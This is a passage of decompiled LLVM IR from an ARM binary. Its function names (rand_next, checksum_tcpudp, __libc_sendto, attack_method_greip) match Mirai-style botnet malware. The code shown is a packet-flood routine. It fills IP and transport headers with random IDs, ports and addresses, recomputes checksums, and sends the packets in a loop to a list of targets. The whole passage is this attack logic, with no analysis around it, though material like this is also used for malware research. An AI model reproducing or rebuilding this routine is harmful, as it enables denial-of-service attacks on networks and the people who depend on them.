  store i32 %v4_9760, i32* %r3.global-to-local, align 4
  %v2_9768 = load i32, i32* @r5, align 4
  %v3_9768 = add i32 %v2_9768, 16
  %v4_9768 = inttoptr i32 %v3_9768 to i32*
  store i32 %v4_9760, i32* %v4_9768, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_976c = load i32, i32* @r5, align 4
  %v2_976c = add i32 %v1_976c, 12
  %v3_976c = inttoptr i32 %v2_976c to i32*
  store i32 %v0_974c, i32* %v3_976c, align 4
  %v3_9770 = load i32, i32* %stack_var_-44, align 4
  %v0_9774 = load i32, i32* %r4.global-to-local, align 4
  %v1_9774 = add i32 %v0_9774, 58
  store i32 %v1_9774, i32* @r6, align 4
  store i32 %v4_9778, i32* %r2.global-to-local, align 4
  %v1_977c = add i32 %v3_9770, 1
  store i32 %v1_977c, i32* @r4, align 4
  store i32 %v4_9780, i32* %r3.global-to-local, align 4
  %v1_9784 = load i32, i32* @sl, align 4
  %v9_9784 = icmp eq i32 %v1_977c, %v1_9784
  store i1 %v9_9784, i1* %cpsr_z.global-to-local, align 1
  %v0_9788 = load i32, i32* @r7, align 4
  %v1_9788 = trunc i32 %v0_9788 to i16
  %v3_9788 = add i32 %v0_9774, 62
  %v4_9788 = inttoptr i32 %v3_9788 to i16*
  store i16 %v1_9788, i16* %v4_9788, align 2
  %v0_978c = load i32, i32* %r2.global-to-local, align 4
  %v1_978c = trunc i32 %v0_978c to i16
  %v2_978c = load i32, i32* @r6, align 4
  %v3_978c = inttoptr i32 %v2_978c to i16*
  store i16 %v1_978c, i16* %v3_978c, align 2
  %v0_9790 = load i32, i32* %r3.global-to-local, align 4
  %v1_9790 = trunc i32 %v0_9790 to i16
  %v2_9790 = load i32, i32* @r6, align 4
  %v3_9790 = add i32 %v2_9790, 2
  %v4_9790 = inttoptr i32 %v3_9790 to i16*
  store i16 %v1_9790, i16* %v4_9790, align 2
  %v0_9794 = load i32, i32* @r4, align 4
  store i32 %v0_9794, i32* %stack_var_-44, align 4
  %v5_9798 = icmp slt i32 %v1_977c, %v1_9784
  br i1 %v5_9798, label %dec_label_pc_9640, label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %bb85
  %v1_97a4 = add i32 %v5_94c0, 8
  store i32 %v1_97a4, i32* %r4.global-to-local, align 4
  %v1_97a8 = add i32 %v5_94c0, 66
  store i32 %v1_97a8, i32* %r5.global-to-local, align 4
  %v0_97b8.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_97b4.preheader

dec_label_pc_97b4.preheader:                      ; preds = %dec_label_pc_979c, %dec_label_pc_9a4c
  %v0_97b8.pre = phi i32 [ %v0_97b8.pre.pre, %dec_label_pc_979c ], [ 0, %dec_label_pc_9a4c ]
  %stack_var_-132.0.ph = phi i32 [ %v1_97a8, %dec_label_pc_979c ], [ %v1_9a58, %dec_label_pc_9a4c ]
  %stack_var_-136.0.ph = phi i32 [ %v1_97a4, %dec_label_pc_979c ], [ %v1_9a54, %dec_label_pc_9a4c ]
  %v2_9a08 = icmp eq i32 %v1_956c, 0
  %v2_9850 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9868 = ptrtoint i32* %stack_var_-52 to i32
  %v2_9878 = ptrtoint i32* %stack_var_-56 to i32
  %v2_9884 = ptrtoint i32* %stack_var_-54 to i32
  %v2_9898 = icmp eq i32 %v1_94e0, 0
  %v2_97f8 = icmp eq i32 %v5_9514, -1
  %v7_97f8 = icmp eq i32 %v5_9514, -1
  br label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_97b4, %dec_label_pc_98a0, %dec_label_pc_97b4.preheader
  %v0_97b8 = phi i32 [ %v0_97b8.pre, %dec_label_pc_97b4.preheader ], [ 0, %dec_label_pc_97b4 ], [ %v1_993c, %dec_label_pc_98a0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_97b8 = icmp eq i32 %v0_97b8, 0
  store i1 %v2_97b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_97b8, label %dec_label_pc_97b4, label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %dec_label_pc_97b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_97c8

dec_label_pc_97c8:                                ; preds = %dec_label_pc_98a0, %dec_label_pc_97c4
  %v1_97dc = phi i32 [ %v1_9938, %dec_label_pc_98a0 ], [ 0, %dec_label_pc_97c4 ]
  %v5_97cc = mul i32 %v1_97dc, 24
  %v1_97d0 = load i32, i32* @sb, align 4
  %v2_97d0 = add i32 %v1_97d0, %v5_97cc
  store i32 %v2_97d0, i32* %r3.global-to-local, align 4
  store i32 %v2_93f4, i32* %r4.global-to-local, align 4
  %v1_97d8 = add i32 %v2_97d0, 20
  %v2_97d8 = inttoptr i32 %v1_97d8 to i8*
  %v3_97d8 = load i8, i8* %v2_97d8, align 1
  %v4_97d8 = zext i8 %v3_97d8 to i32
  store i32 %v4_97d8, i32* %r2.global-to-local, align 4
  %v4_97dc = mul i32 %v1_97dc, 4
  %v5_97dc = add i32 %v4_97dc, %v2_93f4
  %v6_97dc = inttoptr i32 %v5_97dc to i32*
  %v7_97dc = load i32, i32* %v6_97dc, align 4
  store i32 %v7_97dc, i32* @r5, align 4
  %v7_97e0 = icmp eq i8 %v3_97d8, 31
  store i1 %v7_97e0, i1* %cpsr_z.global-to-local, align 1
  %v1_97e4 = add i32 %v7_97dc, 24
  store i32 %v1_97e4, i32* @r7, align 4
  %v1_97e8 = add i32 %v7_97dc, 38
  store i32 %v1_97e8, i32* @r6, align 4
  %v1_97ec = add i32 %v7_97dc, 58
  store i32 %v1_97ec, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_97d8, 32
  br i1 %tmp90, label %dec_label_pc_994c, label %dec_label_pc_97f4

dec_label_pc_97f4:                                ; preds = %dec_label_pc_97c8
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9808 = load i32, i32* @fp, align 4
  %v9_9808 = icmp eq i32 %v0_9808, 65535
  store i1 %v9_9808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9808, label %dec_label_pc_99c4, label %dec_label_pc_9810

dec_label_pc_9810:                                ; preds = %dec_label_pc_99ac.dec_label_pc_9810_crit_edge, %dec_label_pc_9800
  %v1_9814 = phi i32 [ %v1_9814.pre, %dec_label_pc_99ac.dec_label_pc_9810_crit_edge ], [ 65535, %dec_label_pc_9800 ]
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v9_9814 = icmp eq i32 %v3_9574, %v1_9814
  store i1 %v9_9814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9814, label %dec_label_pc_99ec, label %dec_label_pc_981c

dec_label_pc_981c:                                ; preds = %dec_label_pc_99c4.dec_label_pc_981c_crit_edge, %dec_label_pc_9810
  %v1_9820 = phi i32 [ %v1_9820.pre, %dec_label_pc_99c4.dec_label_pc_981c_crit_edge ], [ %v1_9814, %dec_label_pc_9810 ]
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v9_9820 = icmp eq i32 %v3_9578, %v1_9820
  store i1 %v9_9820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9820, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9828:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %dec_label_pc_9a1c, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_9828
  %v1_9830 = load i32, i32* @r5, align 4
  %v2_9830 = add i32 %v1_9830, 16
  %v3_9830 = inttoptr i32 %v2_9830 to i32*
  %v4_9830 = load i32, i32* %v3_9830, align 4
  store i32 %v4_9830, i32* %r3.global-to-local, align 4
  %v2_9834 = load i32, i32* @r6, align 4
  %v3_9834 = add i32 %v2_9834, 16
  %v4_9834 = inttoptr i32 %v3_9834 to i32*
  store i32 %v4_9830, i32* %v4_9834, align 4
  br label %dec_label_pc_983c

dec_label_pc_983c:                                ; preds = %bb88, %.thread11, %dec_label_pc_9a1c
  %v0_983c = call i32 @rand_next()
  store i32 %v0_983c, i32* %r0.global-to-local, align 4
  store i32 %v0_983c, i32* %stack_var_-48, align 4
  %v0_9844 = call i32 @rand_next()
  store i32 %v0_9844, i32* %r0.global-to-local, align 4
  store i32 %v0_9844, i32* %stack_var_-52, align 4
  %v0_984c = call i32 @rand_next()
  store i32 %v2_9850, i32* %r1.global-to-local, align 4
  store i32 %v0_984c, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_985c = load i32, i32* @r7, align 4
  store i32 %v0_985c, i32* %r0.global-to-local, align 4
  %v3_9860 = call i32 @util_memcpy(i32 %v0_985c, i32 %v2_9850, i32 4)
  %v0_9864 = load i32, i32* @r7, align 4
  %v1_9864 = add i32 %v0_9864, 6
  store i32 %v1_9864, i32* %r0.global-to-local, align 4
  store i32 %v2_9868, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_9870 = call i32 @util_memcpy(i32 %v1_9864, i32 %v2_9868, i32 4)
  %v0_9874 = load i32, i32* @r7, align 4
  %v1_9874 = add i32 %v0_9874, 4
  store i32 %v1_9874, i32* %r0.global-to-local, align 4
  store i32 %v2_9878, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9880 = call i32 @util_memcpy(i32 %v1_9874, i32 %v2_9878, i32 2)
  store i32 %v2_9884, i32* %r1.global-to-local, align 4
  %v0_9888 = load i32, i32* @r7, align 4
  %v1_9888 = add i32 %v0_9888, 10
  store i32 %v1_9888, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9890 = call i32 @util_memcpy(i32 %v1_9888, i32 %v2_9884, i32 2)
  store i32 %v3_9890, i32* %r0.global-to-local, align 4
  store i32 %v1_94e0, i32* %r1.global-to-local, align 4
  store i1 %v2_9898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9898, label %dec_label_pc_98a0, label %dec_label_pc_9a28

dec_label_pc_98a0:                                ; preds = %dec_label_pc_983c, %dec_label_pc_9a28
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_98a4 = load i32, i32* @r5, align 4
  %v3_98a4 = add i32 %v2_98a4, 10
  %v4_98a4 = inttoptr i32 %v3_98a4 to i16*
  store i16 0, i16* %v4_98a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* @r0, align 4
  %v2_98b0 = call i32 @checksum_generic(i32 %v0_98ac, i32 20)
  %v3_98b0 = trunc i32 %v2_98b0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_98b8 = load i32, i32* @r5, align 4
  %v4_98b8 = add i32 %v3_98b8, 10
  %v5_98b8 = inttoptr i32 %v4_98b8 to i16*
  store i16 %v3_98b0, i16* %v5_98b8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_98c0 = trunc i32 %v0_98c0 to i16
  %v2_98c0 = load i32, i32* @r6, align 4
  %v3_98c0 = add i32 %v2_98c0, 10
  %v4_98c0 = inttoptr i32 %v3_98c0 to i16*
  store i16 %v1_98c0, i16* %v4_98c0, align 2
  %v0_98c4 = load i32, i32* @r6, align 4
  store i32 %v0_98c4, i32* @r0, align 4
  %v2_98c8 = call i32 @checksum_generic(i32 %v0_98c4, i32 20)
  %v3_98c8 = trunc i32 %v2_98c8 to i16
  store i32 %v2_98c8, i32* %r0.global-to-local, align 4
  %v3_98cc = load i32, i32* @r6, align 4
  %v4_98cc = add i32 %v3_98cc, 10
  %v5_98cc = inttoptr i32 %v4_98cc to i16*
  store i16 %v3_98c8, i16* %v5_98cc, align 2
  store i32 0, i32* @r4, align 4
  %v0_98d4 = load i32, i32* @r8, align 4
  store i32 %v0_98d4, i32* @r1, align 4
  %v1_98d8 = add i32 %v0_98d4, 4
  %v2_98d8 = inttoptr i32 %v1_98d8 to i16*
  %v3_98d8 = load i16, i16* %v2_98d8, align 2
  %v4_98d8 = zext i16 %v3_98d8 to i32
  store i32 %v4_98d8, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_98e0 = add i32 %v0_98d4, 6
  %v4_98e0 = inttoptr i32 %v3_98e0 to i16*
  store i16 0, i16* %v4_98e0, align 2
  %v0_98e4 = load i32, i32* @r6, align 4
  store i32 %v0_98e4, i32* %r0.global-to-local, align 4
  %v4_98e8 = call i32 @checksum_tcpudp(i32 %v0_98e4, i32 %v0_98d4, i32 %v4_98d8, i32 %stack_var_-136.0.ph)
  %v5_98e8 = trunc i32 %v4_98e8 to i16
  store i32 %v4_98e8, i32* %r0.global-to-local, align 4
  %v3_98ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98ec, i32* %r2.global-to-local, align 4
  %v3_98f0 = mul i32 %v3_98ec, 32
  store i32 %v3_98f0, i32* %r3.global-to-local, align 4
  %v0_98f4 = load i32, i32* @r5, align 4
  %v1_98f4 = add i32 %v0_98f4, 16
  %v2_98f4 = inttoptr i32 %v1_98f4 to i32*
  %v3_98f4 = load i32, i32* %v2_98f4, align 4
  %v5_98f8 = mul i32 %v3_98ec, 24
  store i32 %v5_98f8, i32* %r3.global-to-local, align 4
  %v1_98fc = load i32, i32* @sb, align 4
  %v2_98fc = add i32 %v1_98fc, %v5_98f8
  store i32 %v2_98fc, i32* @lr, align 4
  %v2_9900 = add i32 %v2_98fc, 4
  %v3_9900 = inttoptr i32 %v2_9900 to i32*
  store i32 %v3_98f4, i32* %v3_9900, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9908 = load i32, i32* @r8, align 4
  %v4_9908 = add i32 %v3_9908, 6
  %v5_9908 = inttoptr i32 %v4_9908 to i16*
  store i16 %v5_98e8, i16* %v5_9908, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9910 = load i32, i32* %r1.global-to-local, align 4
  %v1_9910 = trunc i32 %v0_9910 to i16
  %v2_9910 = load i32, i32* %r3.global-to-local, align 4
  %v3_9910 = load i32, i32* @sb, align 4
  %v4_9910 = add i32 %v3_9910, %v2_9910
  %v5_9910 = inttoptr i32 %v4_9910 to i16*
  store i16 %v1_9910, i16* %v5_9910, align 2
  %v0_9914 = load i32, i32* @r4, align 4
  %v1_9914 = trunc i32 %v0_9914 to i16
  %v2_9914 = load i32, i32* @lr, align 4
  %v3_9914 = add i32 %v2_9914, 2
  %v4_9914 = inttoptr i32 %v3_9914 to i16*
  store i16 %v1_9914, i16* %v4_9914, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_991c = load i32, i32* @r5, align 4
  store i32 %v0_991c, i32* %r1.global-to-local, align 4
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_9928 = load i32, i32* @lr, align 4
  %v0_992c = load i32, i32* %ip.global-to-local, align 4
  %v6_9930 = call i32 @__libc_sendto(i32 %v3_9528, i32 %v0_991c, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_9928, i32 %v0_992c)
  %v3_9934 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9934, i32* %r3.global-to-local, align 4
  %v1_9938 = add i32 %v3_9934, 1
  store i32 %v1_9938, i32* %r0.global-to-local, align 4
  %v1_993c = load i32, i32* @sl, align 4
  %v9_993c = icmp eq i32 %v1_9938, %v1_993c
  store i1 %v9_993c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9938, i32* %stack_var_-44, align 4
  %v6_9944 = icmp slt i32 %v1_9938, %v1_993c
  br i1 %v6_9944, label %dec_label_pc_97c8, label %dec_label_pc_97b4

dec_label_pc_994c:                                ; preds = %dec_label_pc_97c8
  %v1_994c = add i32 %v2_97d0, 16
  %v2_994c = inttoptr i32 %v1_994c to i32*
  %v3_994c = load i32, i32* %v2_994c, align 4
  store i32 %v3_994c, i32* %r4.global-to-local, align 4
  %v0_9950 = call i32 @rand_next()
  store i32 %v0_9950, i32* %r0.global-to-local, align 4
  %v3_9954 = load i32, i32* %stack_var_-44, align 4
  %v5_995c = mul i32 %v3_9954, 24
  %v0_9960 = load i32, i32* %r4.global-to-local, align 4
  %v1_9960 = and i32 %v0_9960, 16711680
  store i32 %v1_9960, i32* %ip.global-to-local, align 4
  %v3_9964 = udiv i32 %v0_9960, 16777216
  %v4_9968 = udiv i32 %v1_9960, 256
  %v5_9968 = or i32 %v4_9968, %v3_9964
  store i32 %v5_9968, i32* %r2.global-to-local, align 4
  %v1_996c = load i32, i32* @sb, align 4
  %v2_996c = add i32 %v1_996c, %v5_995c
  store i32 %v2_996c, i32* %r1.global-to-local, align 4
  %v1_9970 = and i32 %v0_9960, 65280
  store i32 %v1_9970, i32* %r3.global-to-local, align 4
  %v1_9974 = add i32 %v2_996c, 20
  %v2_9974 = inttoptr i32 %v1_9974 to i8*
  %v3_9974 = load i8, i8* %v2_9974, align 1
  %v4_9974 = zext i8 %v3_9974 to i32
  store i32 %v4_9974, i32* %ip.global-to-local, align 4
  %v5_997c = call i32 @llvm.bswap.i32(i32 %v0_9960)
  %v7_9980 = lshr i32 %v0_9950, %v4_9974
  %v8_9980 = add i32 %v7_9980, %v5_997c
  store i32 %v8_9980, i32* %r2.global-to-local, align 4
  %v1_9984 = and i32 %v8_9980, 16711680
  store i32 %v1_9984, i32* %r0.global-to-local, align 4
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  %v5_999c = call i32 @llvm.bswap.i32(i32 %v8_9980)
  store i32 %v5_999c, i32* %r3.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  %v1_99a4 = load i32, i32* @r5, align 4
  %v2_99a4 = add i32 %v1_99a4, 16
  %v3_99a4 = inttoptr i32 %v2_99a4 to i32*
  store i32 %v5_999c, i32* %v3_99a4, align 4
  br i1 %v2_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_99ac:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  %v0_99ac = call i32 @rand_next()
  store i32 %v0_99ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_99b8 = load i32, i32* @fp, align 4
  %v9_99b8 = icmp eq i32 %v0_99b8, 65535
  store i1 %v9_99b8, i1* %cpsr_z.global-to-local, align 1
  %v1_99bc = load i32, i32* @r5, align 4
  %v2_99bc = add i32 %v1_99bc, 12
  %v3_99bc = inttoptr i32 %v2_99bc to i32*
  store i32 %v0_99ac, i32* %v3_99bc, align 4
  br i1 %v9_99b8, label %dec_label_pc_99c4, label %dec_label_pc_99ac.dec_label_pc_9810_crit_edge

dec_label_pc_99ac.dec_label_pc_9810_crit_edge:    ; preds = %dec_label_pc_99ac
  %v1_9814.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9810

dec_label_pc_99c4:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_9800
  %v0_99c4 = call i32 @rand_next()
  %v3_99cc = urem i32 %v0_99c4, 65536
  store i32 %v3_99cc, i32* %r0.global-to-local, align 4
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v1_99d8 = sub nsw i32 999, %v3_99cc
  store i32 %v1_99d8, i32* %r3.global-to-local, align 4
  %v1_99dc = load i32, i32* %r4.global-to-local, align 4
  %v9_99dc = icmp eq i32 %v3_9574, %v1_99dc
  store i1 %v9_99dc, i1* %cpsr_z.global-to-local, align 1
  %v1_99e0 = trunc i32 %v0_99c4 to i16
  %v2_99e0 = load i32, i32* @r5, align 4
  %v3_99e0 = add i32 %v2_99e0, 4
  %v4_99e0 = inttoptr i32 %v3_99e0 to i16*
  store i16 %v1_99e0, i16* %v4_99e0, align 2
  %v0_99e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_99e4 = trunc i32 %v0_99e4 to i16
  %v2_99e4 = load i32, i32* @r6, align 4
  %v3_99e4 = add i32 %v2_99e4, 4
  %v4_99e4 = inttoptr i32 %v3_99e4 to i16*
  store i16 %v1_99e4, i16* %v4_99e4, align 2
  br i1 %v9_99dc, label %dec_label_pc_99ec, label %dec_label_pc_99c4.dec_label_pc_981c_crit_edge

dec_label_pc_99c4.dec_label_pc_981c_crit_edge:    ; preds = %dec_label_pc_99c4
  %v1_9820.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_981c

dec_label_pc_99ec:                                ; preds = %dec_label_pc_99c4, %dec_label_pc_9810
  %v0_99ec = call i32 @rand_next()
  %v1_99ec = trunc i32 %v0_99ec to i16
  store i32 %v0_99ec, i32* %r0.global-to-local, align 4
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v1_99f4 = load i32, i32* %r4.global-to-local, align 4
  %v9_99f4 = icmp eq i32 %v3_9578, %v1_99f4
  store i1 %v9_99f4, i1* %cpsr_z.global-to-local, align 1
  %v3_99f8 = load i32, i32* @r5, align 4
  %v4_99f8 = add i32 %v3_99f8, 58
  %v5_99f8 = inttoptr i32 %v4_99f8 to i16*
  store i16 %v1_99ec, i16* %v5_99f8, align 2
  br i1 %v9_99f4, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  %v0_9a00 = call i32 @rand_next()
  %v1_9a00 = trunc i32 %v0_9a00 to i16
  store i32 %v0_9a00, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_9a00
  %v3_9a1032 = load i32, i32* @r8, align 4
  %v4_9a1033 = add i32 %v3_9a1032, 2
  %v5_9a1034 = inttoptr i32 %v4_9a1033 to i16*
  store i16 %v1_9a00, i16* %v5_9a1034, align 2
  br label %dec_label_pc_9a1c

bb88:                                             ; preds = %dec_label_pc_9a00
  %v1_9a0c = load i32, i32* @r5, align 4
  %v2_9a0c = add i32 %v1_9a0c, 16
  %v3_9a0c = inttoptr i32 %v2_9a0c to i32*
  %v4_9a0c = load i32, i32* %v3_9a0c, align 4
  store i32 %v4_9a0c, i32* %r3.global-to-local, align 4
  %v3_9a10 = load i32, i32* @r8, align 4
  %v4_9a10 = add i32 %v3_9a10, 2
  %v5_9a10 = inttoptr i32 %v4_9a10 to i16*
  store i16 %v1_9a00, i16* %v5_9a10, align 2
  %v1_9a14 = load i32, i32* %r3.global-to-local, align 4
  %v2_9a14 = load i32, i32* @r6, align 4
  %v3_9a14 = add i32 %v2_9a14, 16
  %v4_9a14 = inttoptr i32 %v3_9a14 to i32*
  store i32 %v1_9a14, i32* %v4_9a14, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a1c:                                ; preds = %.thread31, %dec_label_pc_9828
  %v0_9a1c = call i32 @rand_next()
  store i32 %v0_9a1c, i32* %r0.global-to-local, align 4
  %v1_9a20 = load i32, i32* @r6, align 4
  %v2_9a20 = add i32 %v1_9a20, 16
  %v3_9a20 = inttoptr i32 %v2_9a20 to i32*
  store i32 %v0_9a1c, i32* %v3_9a20, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a28:                                ; preds = %dec_label_pc_983c
  %v0_9a28 = load i32, i32* @r8, align 4
  %v1_9a28 = add i32 %v0_9a28, 8
  store i32 %v1_9a28, i32* %r0.global-to-local, align 4
  store i32 %v5_94c0, i32* %r1.global-to-local, align 4
  %v2_9a30 = inttoptr i32 %v1_9a28 to i16*
  %v3_9a30 = call i32 @rand_str(i16* %v2_9a30, i32 %v5_94c0)
  store i32 %v3_9a30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98a0

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9538
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v1_9a3c = call i32 @__GI___libc_close(i32 %v3_9528)
  store i32 %v1_9a3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a40

dec_label_pc_9a40:                                ; preds = %entry, %dec_label_pc_9a38
  %v1_9a48 = phi i32 [ %v3_9528, %entry ], [ %v1_9a3c, %dec_label_pc_9a38 ]
  store i32 %v3_93d8, i32* %r4.global-to-local, align 4
  store i32 %v6_93d8, i32* %r5.global-to-local, align 4
  store i32 %v24_93d8, i32* %fp.global-to-local, align 4
  ret i32 %v1_9a48

dec_label_pc_9a4c:                                ; preds = %dec_label_pc_9560
  %v1_9a54 = add i32 %v5_94c0, 8
  store i32 %v1_9a54, i32* %r1.global-to-local, align 4
  %v1_9a58 = add i32 %v5_94c0, 66
  store i32 %v1_9a58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_97b4.preheader

; uselistorder directives
  uselistorder i32 %v1_9a58, { 1, 0 }
  uselistorder i32 %v1_9a54, { 1, 0 }
  uselistorder i16 %v1_9a00, { 1, 0 }
  uselistorder i32 %v0_9a00, { 1, 0 }
  uselistorder i32 %v0_99ec, { 1, 0 }
  uselistorder i32 %v3_99cc, { 1, 0 }
  uselistorder i32 %v0_99c4, { 1, 0 }
  uselistorder i32 %v5_999c, { 1, 0 }
  uselistorder i32 %v0_9960, { 1, 2, 0, 3 }
  uselistorder i32 %v1_993c, { 1, 2, 0 }
  uselistorder i32 %v1_9938, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_98ec, { 1, 0, 2 }
  uselistorder i32 %v4_98e8, { 1, 0 }
  uselistorder i32 %v0_98d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_98c8, { 1, 0 }
  uselistorder i32 %v7_97dc, { 2, 1, 0, 3 }
  uselistorder i1 %v7_97f8, { 2, 1, 0 }
  uselistorder i1 %v2_9a08, { 2, 3, 1, 0 }
  uselistorder i32 %v0_974c, { 1, 0, 2 }
  uselistorder i32 %v3_95c8, { 1, 0 }
  uselistorder i32 %v3_95ac, { 1, 2, 0 }
  uselistorder i32 %v1_95a8, { 1, 0 }
  uselistorder i32 %v1_956c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9568, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9564, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9560, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9558, { 1, 0 }
  uselistorder i1 %v7_952c, { 1, 0 }
  uselistorder i32 %v3_9528, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_9514, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_94e0, { 1, 2, 0 }
  uselistorder i32 %v5_94c0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_9474, { 1, 0 }
  uselistorder i32 %v1_9450, { 2, 1, 0 }
  uselistorder i32 %v5_9448, { 1, 0 }
  uselistorder i8 %v5_942c, { 0, 2, 1 }
  uselistorder i32 %v6_940c, { 1, 0 }
  uselistorder i32 %v2_93f4, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 1, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 10, 12, 11, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 11, 37, 12, 13, 15, 14, 16, 17, 19, 18, 21, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 17, 27, 28, 29, 30, 31, 33, 32, 36, 34, 35, 39, 37, 38, 40, 42, 41, 43, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 8, 9, 10, 11, 12, 13, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9a40, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
  uselistorder label %dec_label_pc_983c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_97b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_97b4.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_method_greip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
